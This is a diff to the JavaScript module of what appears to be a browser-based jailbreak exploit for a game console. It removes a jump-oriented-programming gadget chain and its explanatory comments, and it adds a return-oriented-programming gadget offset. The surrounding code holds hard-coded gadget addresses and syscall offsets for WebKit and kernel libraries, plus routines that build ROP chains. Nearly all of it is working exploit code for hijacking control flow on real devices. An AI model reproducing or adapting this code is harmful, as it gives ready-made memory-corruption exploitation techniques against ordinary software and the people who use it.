@@ -42,51 +42,6 @@ export let libkernel_base = null;
 // libSceLibcInternal.sprx
 export let libc_base = null;
 
-// gadgets for the JOP chain
-//
-// When the scrollLeft getter native function is called on the console, rsi is
-// the JS wrapper for the WebCore textarea class.
-const jop1 = `
-mov rdi, qword ptr [rsi + 0x10]
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x18]
-`;
-// Since the method of code redirection we used is via redirecting a call to
-// jump to our JOP chain, we have the return address of the caller on entry.
-//
-// jop1 pushed another object (via the call instruction) but we want no
-// extra objects between the return address and the rbp that will be pushed by
-// jop2 later. So we pop the return address pushed by jop1.
-//
-// This will make pivoting back easy, just "leave; ret".
-const jop2 = `
-pop rsi
-jmp qword ptr [rax + 0x1c]
-`;
-const jop3 = `
-mov rdi, qword ptr [rax + 8]
-mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 0x30]
-`;
-// rbp is now pushed, any extra objects pushed by the call instructions can be
-// ignored
-const jop4 = `
-push rbp
-mov rbp, rsp
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x58]
-`;
-const jop5 = `
-mov rdx, qword ptr [rax + 0x18]
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x10]
-`;
-const jop6 = `
-push rdx
-jmp qword ptr [rax]
-`;
-const jop7 = "pop rsp; ret";
-
 let syscall_map = {
   1: 0x33b80, // sys_exit
   2: 0x34b30, // sys_fork
@@ -444,20 +399,9 @@ let webkit_gadget_offsets = new Map(
     "mov rax, qword ptr [rax]; ret": 0x0000000000047fec, // `48 8b 00 c3`
     "mov qword ptr [rdi], rax; ret": 0x000000000003a79a, // `48 89 07 c3`
     "mov dword ptr [rdi], eax; ret": 0x000000000003469f, // `89 07 c3`
-    // not present in webkit, libc, and libkernel
-    // "mov dword ptr [rax], esi; ret": 0x000000000109b1f0, // `89 30 c3`
+    // esi gadget is not present in webkit, libc, and libkernel, so we use ecx/edx
     "mov dword ptr [rax], ecx; ret": 0x0000000000404ef5, // `89 08 c3`
-
-
-    // TODO: none of the JOPs except the last one are valid. Need to learn and find these, potentially rewrite.  
-    // [jop1]: 0x00000000002dfd59, //
-    // [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
-    // [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`
-
-    // [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
-    // [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
-    // [jop6]: 0x00000000028bd332, // `52 ff 20`
-    // [jop7]: 0x0000000000099a22, // `5c c3`
+    "mov dword ptr [rax], edx; ret": 0x00000000001378b5, // `89 10 c3`
   }),
 );
 
@@ -545,7 +489,6 @@ class Chain320Base extends ChainBase {
     this.push_call(this.get_gadget("__error"));
     this.push_gadget("pop rcx; ret");
     this.push_value(0);
-    // TODO: most things will return 0 because of this missing gadget.
     this.push_gadget("mov dword ptr [rax], ecx; ret");
   }
 }
